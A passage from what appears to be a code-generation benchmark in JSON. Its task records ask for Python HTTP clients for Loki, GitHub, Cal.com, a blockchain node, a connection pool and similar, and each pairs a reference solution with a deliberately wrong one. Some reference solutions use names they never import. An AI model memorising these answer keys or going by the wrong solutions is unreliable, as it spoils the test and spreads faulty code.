release_response.json()['id']\n\n    # Upload file\n    asset_url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases/{release_id}/assets\"\n    with open(file_path, 'rb') as file:\n        files = {'file': (os.path.basename(file_path), file)}\n        headers = {\"Authorization\": auth_header}\n        asset_response = requests.post(asset_url, files=files, headers=headers)\n        asset_response.raise_for_status()\n\n    # Extract download URL\n    download_url = asset_response.json().get('download_url')\n    if not download_url:\n        raise ValueError(\"Download URL not found in asset response\")\n\n    return {\n        'release_id': str(release_id),\n        'download_url': download_url\n    }"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Python class that interacts with a Loki logging system through HTTP and WebSocket connections, allowing for querying log ranges and tailing live logs.\n\nClass Description: The LokiClient class provides methods to query historical log data (query_range) and establish a WebSocket connection for live log tailing (create_tail_ws). The LokiTailWs class manages the WebSocket connection for live log streaming.\n\nAttributes:\n- query_range_url: str - Endpoint path for querying log ranges\n- tail_url: str - Endpoint path for tailing live logs\n- base_url: str - Base URL of the Loki server\n\nMethods:\n- __init__(base_url: str) -> None - Initializes the client with the Loki server's base URL\n- query_range(query: str, start: str, end: str, limit: int = 100) -> dict - Queries log data within a specified time range\n- create_tail_ws(query: str, limit: int = 100) -> LokiTailWs - Creates a WebSocket connection for live log tailing\n\nLokiTailWs Class Description: Manages a WebSocket connection for streaming live logs from Loki.\n\nAttributes:\n- _ws: WebSocket - The active WebSocket connection\n\nMethods:\n- __init__(ws: WebSocket) -> None - Initializes with an established WebSocket connection\n- messages() -> Generator - Yields incoming log messages from the WebSocket\n- close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import urllib.parse\nimport requests\nfrom websockets.sync.client import connect as ws_connect\n\nclass LokiClient:\n    query_range_url = '/loki/api/v1/query_range'\n    tail_url = '/loki/api/v1/tail'\n\n    def __init__(self, base_url: str):\n        self.base_url = base_url.rstrip('/')\n\n    def query_range(self, query, start, end, limit=100):\n        params = {\n            'query': query,\n            'start': start,\n            'end': end,\n            'limit': limit,\n        }\n        url = f\"{self.base_url}{self.query_range_url}\"\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            raise Exception(response.text)\n        return response.json()\n\n    def create_tail_ws(self, query, limit=100):\n        data = {'query': query, 'limit': limit}\n        params = urllib.parse.urlencode(data)\n        ws_url = f\"ws://{self.base_url[7:]}\"\n        if self.base_url.startswith('https://'):\n            ws_url = f\"wss://{self.base_url[8:]}\"\n        url = f\"{ws_url}{self.tail_url}?{params}\"\n        ws = ws_connect(url)\n        return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws):\n        self._ws = ws\n\n    def messages(self):\n        for message in self._ws:\n            yield message\n\n    def close(self):\n        if self._ws:\n            self._ws.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport websockets\nimport asyncio\nimport json\n\nclass LokiClient:\n    def __init__(self, base_url: str):\n        self.base_url = base_url\n        self.query_range_url = f\"{base_url}/api/v1/query_range\"\n        self.tail_url = f\"{base_url}/api/v1/tail\"\n\n    def query_range(self, query: str, start: str, end: str, limit: int = 100) -> dict:\n        payload = {\n            \"query\": query,\n            \"start\": start,\n            \"end\": end,\n            \"limit\": limit\n        }\n        response = requests.post(self.query_range_url, json=payload)\n        response.raise_for_status()\n        return response.json()\n\n    async def create_tail_ws(self, query: str, limit: int = 100) -> \"LokiTailWs\":\n        ws_url = f\"{self.base_url}/api/v1/tail?query={query}&limit={limit}\"\n        async with websockets.connect(ws_url) as ws:\n            return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws: websockets.WebSocketConnection):\n        self._ws = ws\n\n    async def messages(self):\n        async for message in self._ws:\n            yield message\n\n    def close(self):\n        self._ws.close()"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Implement a set of functions to interact with the GitHub API for retrieving release, comparison, pull request, and search information.\n\nFunction Description: The functions provide HTTP client functionality to query GitHub's REST API for specific repository information using authentication tokens.\n\nInput:\n- token: str - GitHub personal access token for authentication\n- repo: str - Repository name in format 'owner/repo'\n- base: str - Base commit/tag for comparison (only for get_github_compare)\n- head: str - Head commit/tag for comparison (only for get_github_compare)\n- pr_number: int - Pull request number (only for get_github_pull_request)\n- sha: str - Commit SHA hash (only for search_github_prs)\n\nOutput:\n- get_github_release: str - Returns the latest release tag name\n- get_github_compare: dict - Returns comparison data between two commits/tags\n- get_github_pull_request: dict - Returns pull request details\n- search_github_prs: dict - Returns search results for merged PRs containing the commit SHA",
    "Canonical_solution": "import requests\n\ndef get_github_release(token, repo):\n    response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                          headers={'Authorization': f'token {token}'})\n    while response.status_code == 401:\n        print(\"Error: Invalid GitHub API token.\")\n        token = input('Token: ').strip()\n        response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                              headers={'Authorization': f'token {token}'})\n    release = response.json()\n    return release[\"tag_name\"]\n\ndef get_github_compare(token, repo, base, head):\n    commits = requests.get(f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\", \n                          headers={'Authorization': f'token {token}'}).json()\n    return commits\n\ndef get_github_pull_request(token, repo, pr_number):\n    pr_details = requests.get(f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\", \n                            headers={'Authorization': f'token {token}'}).json()\n    return pr_details\n\ndef search_github_prs(token, repo, sha):\n    prs = requests.get(f\"https://api.github.com/search/issues?q=repo:{repo}+type:pr+is:merged+{sha}\", \n                      headers={'Authorization': f'token {token}'}).json()\n    return prs",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\ndef get_github_release(token, repo):\n    url = f\"https://api.github.com/repos/{repo}/releases/latest\"\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    response = requests.get(url, headers=headers)\n    return response.json()['tag_name']\n\ndef get_github_compare(token, repo, base, head):\n    url = f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\"\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    response = requests.get(url, headers=headers)\n    return response.json()\n\ndef get_github_pull_request(token, repo, pr_number):\n    url = f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\"\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    response = requests.get(url, headers=headers)\n    return response.json()\n\ndef search_github_prs(token, repo, sha):\n    query = f\"is:pr is:merged sha:{sha}\"\n    url = f\"https://api.github.com/search/issues?q={query}\"\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    response = requests.get(url, headers=headers)\n    return response.json()"
  },
  {
    "Task_id": 85,
    "Instruction": "Task Description: Create a Python class that implements a client for interacting with a blockchain network, capable of registering nodes, resolving chain conflicts, retrieving chain data, posting transactions, and registering multiple nodes.\n\nClass Description: The BlockchainClient class provides functionality to interact with nodes in a blockchain network. It maintains a set of node addresses and offers methods to communicate with these nodes using HTTP requests.\n\nAttributes:\n\nnodes: [set] - A set containing the network addresses of all known blockchain nodes\n\nMethods:\n\nregister_node: [register_node](address: str) -> None - Adds a new node to the list of known nodes. The address should be a valid URL.\n\nresolve_conflicts: [resolve_conflicts]() -> Tuple[bool, Optional[list]] - Resolves conflicts by finding and adopting the longest valid chain from the network. Returns a tuple indicating whether the chain was replaced and the new chain if applicable.\n\nget_chain: [get_chain](node: str) -> Tuple[bool, Optional[dict]] - Retrieves the blockchain data from a specific node. Returns a tuple indicating success status and the chain data.\n\npost_transaction: [post_transaction](node: str, sender: str, recipient: str, amount: float) -> Tuple[bool, Optional[dict]] - Posts a new transaction to a specified node. Returns a tuple indicating success status and the response data.\n\nregister_nodes: [register_nodes](node: str, nodes: list) -> Tuple[bool, Optional[dict]] - Registers multiple nodes with a specified node. Returns a tuple indicating success status and the response data.",
    "Canonical_solution": "import requests\n\nclass BlockchainClient:\n    def __init__(self, nodes=None):\n        self.nodes = set(nodes) if nodes else set()\n\n    def register_node(self, address):\n        \"\"\"\n        Add a new node to the list of nodes\n\n        :param address: Address of node. Eg. 'http://192.168.0.5:5000'\n        \"\"\"\n        parsed_url = urlparse(address)\n        if parsed_url.netloc:\n            self.nodes.add(parsed_url.netloc)\n        elif parsed_url.path:\n            self.nodes.add(parsed_url.path)\n        else:\n            raise ValueError('Invalid URL')\n\n    def resolve_conflicts(self):\n        \"\"\"\n        Resolve conflicts by replacing our chain with the longest one in the network.\n\n        :return: Tuple of (True if chain was replaced, new chain if replaced)\n        \"\"\"\n        new_chain = None\n        max_length = 0\n\n        for node in self.nodes:\n            try:\n                response = requests.get(f'http://{node}/chain')\n                if response.status_code == 200:\n                    data = response.json()\n                    length = data['length']\n                    chain = data['chain']\n\n                    if length > max_length:\n                        max_length = length\n                        new_chain = chain\n            except requests.exceptions.RequestException:\n                continue\n\n        return (True, new_chain) if new_chain else (False, None)\n\n    def get_chain(self, node):\n        \"\"\"\n        Get the blockchain from a specific node\n\n        :param node: Node address\n        :return: Tuple of (status, chain data)\n        \"\"\"\n        try:\n            response = requests.get(f'http://{node}/chain')\n            if response.status_code == 200:\n                return (True, response.json())\n            return (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)\n\n    def post_transaction(self, node, sender, recipient, amount):\n        \"\"\"\n        Post a new transaction to a node\n\n        :param node: Node address\n        :param sender: Sender address\n        :param recipient: Recipient address\n        :param amount: Transaction amount\n        :return: Tuple of (status, response data)\n        \"\"\"\n        try:\n            response = requests.post(\n                f'http://{node}/transactions/new',\n                json={\n                    'sender': sender,\n                    'recipient': recipient,\n                    'amount': amount\n                }\n            )\n            return (True, response.json()) if response.status_code == 201 else (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)\n\n    def register_nodes(self, node, nodes):\n        \"\"\"\n        Register multiple nodes with a node\n\n        :param node: Node address to register with\n        :param nodes: List of nodes to register\n        :return: Tuple of (status, response data)\n        \"\"\"\n        try:\n            response = requests.post(\n                f'http://{node}/nodes/register',\n                json={'nodes': list(nodes)}\n            )\n            return (True, response.json()) if response.status_code == 201 else (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\nclass BlockchainClient:\n    def __init__(self):\n        self.nodes = set()\n\n    def register_node(self, address: str) -> None:\n        if address:\n            self.nodes.add(address)\n\n    def resolve_conflicts(self) -> tuple[bool, list]:\n        chains = []\n        for node in self.nodes:\n            success, chain = self.get_chain(node)\n            if success:\n                chains.append(chain)\n        if not chains:\n            return (False, None)\n        longest_chain = max(chains, key=lambda x: len(x))\n        return (True, longest_chain)\n\n    def get_chain(self, node: str) -> tuple[bool, dict]:\n        try:\n            response = requests.get(f\"{node}/chain\")\n            response.raise_for_status()\n            return (True, response.json())\n        except requests.RequestException:\n            return (False, None)\n\n    def post_transaction(self, node: str, sender: str, recipient: str, amount: float) -> tuple[bool, dict]:\n        try:\n            url = f\"{node}/transactions\"\n            data = {\n                \"sender\": sender,\n                \"recipient\": recipient,\n                \"amount\": amount\n            }\n            response = requests.post(url, json=data)\n            response.raise_for_status()\n            return (True, response.json())\n        except requests.RequestException:\n            return (False, None)\n\n    def register_nodes(self, node: str, nodes: list) -> tuple[bool, dict]:\n        try:\n            url = f\"{node}/register_nodes\"\n            data = {\"nodes\": nodes}\n            response = requests.post(url, json=data)\n            response.raise_for_status()\n            return (True, response.json())\n        except requests.RequestException:\n            return (False, None)"
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a Python function that interacts with a REST API to retrieve node version information for installation or to list all available versions of a node.\n\nFunction Description: The function should use the Python requests library to make HTTP GET requests to a specified API endpoint. It should handle both the case where a specific version is requested and where all versions are requested. The function should properly process successful responses and handle errors.\n\nInput:\n- For install_node function:\n  - node_id (str): The unique identifier of the node\n  - version (str, optional): Specific version of the node to retrieve (defaults to None for latest version)\n\n- For all_versions_of_node function:\n  - node_id (str): The unique identifier of the node\n\nOutput:\n- For install_node function:\n  - On success (HTTP 200): Returns parsed NodeVersion data (converted from JSON response)\n  - On failure: Returns None\n\n- For all_versions_of_node function:\n  - On success (HTTP 200): Returns the JSON response containing all versions\n  - On failure: Returns None",
    "Canonical_solution": "import requests\nbase_url = \"https://api.comfy.org\"\n\ndef install_node(node_id, version=None):\n    \"\"\"\n    Retrieves the node version for installation.\n\n    Args:\n      node_id (str): The unique identifier of the node.\n      version (str, optional): Specific version of the node to retrieve. If omitted, the latest version is returned.\n\n    Returns:\n      NodeVersion: Node version data or error message.\n    \"\"\"\n    if version is None:\n        url = f\"{base_url}/nodes/{node_id}/install\"\n    else:\n        url = f\"{base_url}/nodes/{node_id}/install?version={version}\"\n\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Convert the API response to a NodeVersion object\n        return map_node_version(response.json())\n    else:\n        return None\n\ndef all_versions_of_node(node_id):\n    url = f\"https://api.comfy.org/nodes/{node_id}/versions\"\n\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\ndef install_node(node_id, version=None):\n    base_url = \"https://api.example.com\"\n    url = f\"{base_url}/nodes/{node_id}/version\"\n    if version:\n        url += f\"/{version}\"\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        return response.json()\n    except requests.exceptions.RequestException:\n        return None\n\ndef all_versions_of_node(node_id):\n    base_url = \"https://api.example.com\"\n    url = f\"{base_url}/nodes/{node_id}/versions\"\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        return response.json()\n    except requests.exceptions.RequestException:\n        return None"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Implement a Python function to download a file from a given URL and cache it locally, with progress tracking and ETag-based caching.\n\nFunction Description: The function should download a file from a specified URL to a local cache directory, using ETag headers for cache validation. It should show download progress and handle temporary files during download. If the file already exists in cache (verified by ETag), it should skip downloading.\n\nInput:\n- url: str - The URL of the file to download\n- cache_dir: Optional[str] - (Optional) Directory path for caching downloaded files. Defaults to DATASET_CACHE if None.\n\nOutput:\n- str - Returns the local file path where the downloaded content is cached\n\nNote: The function should:\n1. Create cache directory if it doesn't exist\n2. Check file existence using HEAD request and ETag\n3. Download with progress bar if not in cache\n4. Store metadata (URL and ETag) alongside cached file\n5. Handle temporary files safely during download\n6. Return final cache path",
    "Canonical_solution": "import os\nimport requests\nimport tempfile\nimport shutil\nimport json\nfrom tqdm import tqdm\n\nCACHE_ROOT = Path(os.getenv(\"SCISPACY_CACHE\", str(Path.home() / \".scispacy\")))\nDATASET_CACHE = str(CACHE_ROOT / \"datasets\")\n\ndef http_get(url: str, temp_file: IO) -> None:\n    req = requests.get(url, stream=True)\n    total = int(req.headers.get(\"content-length\", 0))\n    pbar = tqdm(total=total, unit=\"iB\", unit_scale=True, unit_divisor=1024)\n    for chunk in req.iter_content(chunk_size=1024):\n        if chunk:  # filter out keep-alive new chunks\n            size = temp_file.write(chunk)\n            pbar.update(size)\n    pbar.close()\n\ndef get_from_cache(url: str, cache_dir: Optional[str] = None) -> str:\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n\n    os.makedirs(cache_dir, exist_ok=True)\n\n    response = requests.head(url, allow_redirects=True)\n    if response.status_code != 200:\n        raise IOError(\n            \"HEAD request failed for url {} with status code {}\".format(\n                url, response.status_code\n            )\n        )\n    etag = response.headers.get(\"ETag\")\n\n    filename = url_to_filename(url, etag)\n\n    cache_path = os.path.join(cache_dir, filename)\n\n    if not os.path.exists(cache_path):\n        with tempfile.NamedTemporaryFile() as temp_file:\n            print(f\"{url} not found in cache, downloading to {temp_file.name}\")\n\n            http_get(url, temp_file)\n\n            temp_file.flush()\n            temp_file.seek(0)\n\n            print(f\"Finished download, copying {temp_file.name} to cache at {cache_path}\")\n            with open(cache_path, \"wb\") as cache_file:\n                shutil.copyfileobj(temp_file, cache_file)\n\n            meta = {\"url\": url, \"etag\": etag}\n            meta_path = cache_path + \".json\"\n            with open(meta_path, \"w\") as meta_file:\n                json.dump(meta, meta_file)\n\n    return cache_path",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nfrom urllib.parse import urlparse\nfrom tqdm import tqdm\n\ndef download_file(url, cache_dir=None):\n    if cache_dir is None:\n        cache_dir = 'DATASET_CACHE'\n    os.makedirs(cache_dir, exist_ok=True)\n    \n    parsed = urlparse(url)\n    path = parsed.path\n    if not path:\n        filename = 'default_file'\n    else:\n        filename = os.path.basename(path)\n        if not filename:\n            filename = 'default_file'\n    file_path = os.path.join(cache_dir, filename)\n    meta_file = file_path + '.meta'\n    \n    if os.path.exists(file_path):\n        try:\n            with open(meta_file, 'r') as f:\n                stored_url, stored_etag = f.read().splitlines()\n        except (IOError, ValueError):\n            pass\n        \n        try:\n            response = requests.head(url, allow_redirects=True)\n            response.raise_for_status()\n            current_etag = response.headers.get('ETag')\n        except requests.RequestException:\n            current_etag = None\n        \n        if current_etag and stored_etag == current_etag:\n            return file_path\n    else:\n        pass\n    \n    temp_file = file_path + '.tmp'\n    \n    try:\n        response = requests.get(url, stream=True, timeout=10)\n        response.raise_for_status()\n        \n        total_size = int(response.headers.get('content-length', 0))\n        downloaded = 0\n        \n        with open(temp_file, 'wb') as f:\n            for chunk in tqdm(response.iter_content(chunk_size=8192), total=total_size, unit='B', unit_scale=True, desc='Downloading'):\n                if chunk:\n                    f.write(chunk)\n                    downloaded += len(chunk)\n        \n        os.replace(temp_file, file_path)\n        \n        with open(meta_file, 'w') as f:\n            f.write(url)\n            f.write('\\n')\n            f.write(response.headers.get('ETag', ''))\n        \n        return file_path\n    \n    except requests.RequestException as e:\n        if os.path.exists(temp_file):\n            os.remove(temp_file)\n        raise"
  },
  {
    "Task_id": 9,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for retries and timeouts.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, retries on failures, and timeout management.\n\nAttributes:\n- scheme: [str] - The URL scheme (default 'http')\n- ConnectionCls: [class] - The connection class to use (default HTTPConnection)\n- host: [str] - The target host for connections\n- port: [int] - The target port for connections\n- timeout: [Timeout] - Default timeout configuration\n- retries: [Retry] - Retry configuration for failed requests\n- pool: [LifoQueue] - Queue holding the connection pool\n- block: [bool] - Whether to block when pool is empty\n- proxy: [dict] - Proxy configuration\n- proxy_headers: [dict] - Headers for proxy requests\n- conn_kw: [dict] - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given configuration\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, timeout=_Default, **response_kw) -> HTTPResponse - Main method to execute HTTP requests with retry and timeout handling\n- close() -> None - Closes all connections in the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .exceptions import (\n    MaxRetryError,\n    ProtocolError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    HTTPException,\n    BaseSSLError,\n    NewConnectionError,\n    ProxyError\n)\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.queue import LifoQueue\nimport queue\nimport sys\nimport warnings\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            httplib_response = conn.getresponse()\n            return httplib_response\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, timeout=_Default, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=timeout_obj.connect_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError) as e:\n            if isinstance(e, (BaseSSLError, CertificateError)):\n                e = SSLError(e)\n            elif isinstance(e, (SocketError, NewConnectionError)) and self.proxy:\n                e = ProxyError('Cannot connect to proxy.', e)\n            elif isinstance(e, (SocketError, HTTPException)):\n                e = ProtocolError('Connection aborted.', e)\n\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method, url, body, headers,\n                retries=retries, redirect=redirect,\n                timeout=timeout, **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.close()\n            except queue.Empty:\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport socket\nfrom urllib3.util import Timeout, Retry\nfrom queue import LifoQueue\nimport http.client\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.ConnectionCls = http.client.HTTPConnection\n        self.host = host\n        self.port = port or 80\n        self.timeout = timeout\n        self.retries = retries or Retry(total=3, connect=3, read=3, redirect=3)\n        self.pool = LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.conn_kw = conn_kw\n        for _ in range(maxsize):\n            self._put_conn(self._new_conn())\n\n    def _new_conn(self):\n        conn = self.ConnectionCls(self.host, self.port, **self.conn_kw)\n        if self.proxy:\n            conn.proxy_host = self.proxy.get('host')\n            conn.proxy_port = self.proxy.get('port')\n        return conn\n\n    def _get_conn(self, timeout=None):\n        if self.block:\n            conn = self.pool.get(timeout=timeout)\n        else:\n            if self.pool.empty():\n                conn = self._new_conn()\n            else:\n                conn = self.pool.get()\n        return conn\n\n    def _put_conn(self, conn):\n        self.pool.put(conn)\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            resp = conn.getresponse()\n            return resp\n        except socket.error as e:\n            raise e\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, timeout=_Default, **response_kw):\n        retries = retries or self.retries\n        for i in range(retries.total + 1):\n            conn = self._get_conn(timeout)\n            try:\n                resp = self._make_request(conn, method, url, timeout, **response_kw)\n                if redirect and resp.status in (301, 302):\n                    new_url = resp.headers['Location']\n                    continue\n                return resp\n            except socket.error as e:\n                if retries.connect and i < retries.total:\n                    continue\n                raise\n            except socket.timeout as e:\n                if retries.read and i < retries.total:\n                    continue\n                raise\n        raise Exception(\"All retries failed\")\n\n    def close(self):\n        while not self.pool.empty():\n            conn = self.pool.get()\n            if hasattr(conn, 'close'):\n                conn.close()\n```"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Python function that extends a FastAPI application with a new REST endpoint and tests it using the requests library.\n\nFunction Description: The function `test_extend_fastapi` demonstrates how to extend a FastAPI application (wrapped in a Jina Flow) with a new GET endpoint '/hello' that returns a simple JSON message. It then tests this endpoint by making an HTTP request and verifying the response.\n\nInput: None (The function takes no parameters as it's self-contained for demonstration purposes)\n\nOutput: None (The function performs assertions to verify the endpoint works correctly but doesn't return any value)",
    "Canonical_solution": "import requests\nfrom jina import Flow\n\ndef test_extend_fastapi():\n    def extend_rest_function(app):\n        @app.get('/hello', tags=['My Extended APIs'])\n        async def foo():\n            return {'msg': 'hello world'}\n\n        return app\n\n    jina.helper.extend_rest_interface = extend_rest_function\n    f = Flow(protocol='http')\n\n    with f:\n        response = requests.get(f'http://localhost:{f.port}/hello')\n        assert response.status_code == 200\n        assert response.json() == {'msg': 'hello world'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import fastapi\nfrom fastapi.testclient import TestClient\n\ndef test_extend_fastapi():\n    app = fastapi.FastAPI()\n    @app.get(\"/hello\")\n    async def hello():\n        return {\"message\": \"Hello, World!\"}\n    client = TestClient(app)\n    response = client.get(\"/hello\")\n    assert response.status_code == 200\n    assert response.json() == {\"message\": \"Hello, World!\"}"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Create a Python class to interact with the Cal.com API for managing bookings, available time slots, and timezone conversions.\n\nClass Description: The CalComAPI class provides methods to interact with Cal.com's API v2 for scheduling operations. It handles authentication, timezone conversions, and provides functionality to check available slots, create/reschedule/cancel bookings, and view upcoming bookings.\n\nAttributes:\napi_key: str - The API key for authenticating with Cal.com's API\nevent_type_id: int - The event type ID for which bookings are managed\nuser_timezone: str - The timezone to display times to users (default: \"America/New_York\")\n\nMethods:\n_convert_to_user_timezone(utc_time: str) -> str - Converts UTC time string to user's local timezone\n_get_headers(api_version: str = \"2024-08-13\") -> Dict[str, str] - Returns authorization headers for API requests\nget_available_slots(start_date: str, end_date: str) -> str - Retrieves available booking slots between dates\ncreate_booking(start_time: str, name: str, email: str) -> str - Creates a new booking with attendee details\nget_upcoming_bookings(email: str) -> str - Retrieves upcoming bookings for an attendee\nreschedule_booking(booking_uid: str, new_start_time: str, reason: str) -> str - Reschedules an existing booking\ncancel_booking(booking_uid: str, reason: str) -> str - Cancels an existing booking",
    "Canonical_solution": "import requests\nimport pytz\nfrom typing import Dict, Optional\nfrom datetime import datetime\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        utc_dt = datetime.fromisoformat(utc_time.replace(\"Z\", \"+00:00\"))\n        user_tz = pytz.timezone(self.user_timezone)\n        user_dt = utc_dt.astimezone(user_tz)\n        return user_dt.strftime(\"%Y-%m-%d %H:%M %Z\")\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"cal-api-version\": api_version,\n            \"Content-Type\": \"application/json\",\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/slots/available\"\n            querystring = {\n                \"startTime\": f\"{start_date}T00:00:00Z\",\n                \"endTime\": f\"{end_date}T23:59:59Z\",\n                \"eventTypeId\": self.event_type_id,\n            }\n\n            response = requests.get(url, headers=self._get_headers(), params=querystring)\n            if response.status_code == 200:\n                slots = response.json()[\"data\"][\"slots\"]\n                available_slots = []\n                for date, times in slots.items():\n                    for slot in times:\n                        user_time = self._convert_to_user_timezone(slot[\"time\"])\n                        available_slots.append(user_time)\n                return f\"Available slots: {', '.join(available_slots)}\"\n            return f\"Failed to fetch slots: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            start_time = datetime.fromisoformat(start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\n                \"start\": start_time,\n                \"eventTypeId\": self.event_type_id,\n                \"attendee\": {\"name\": name, \"email\": email, \"timeZone\": self.user_timezone},\n            }\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking created successfully for {user_time}. Booking uid: {booking_data['uid']}\"\n            return f\"Failed to create booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            querystring = {\"status\": \"upcoming\", \"attendeeEmail\": email}\n\n            response = requests.get(url, headers=self._get_headers(), 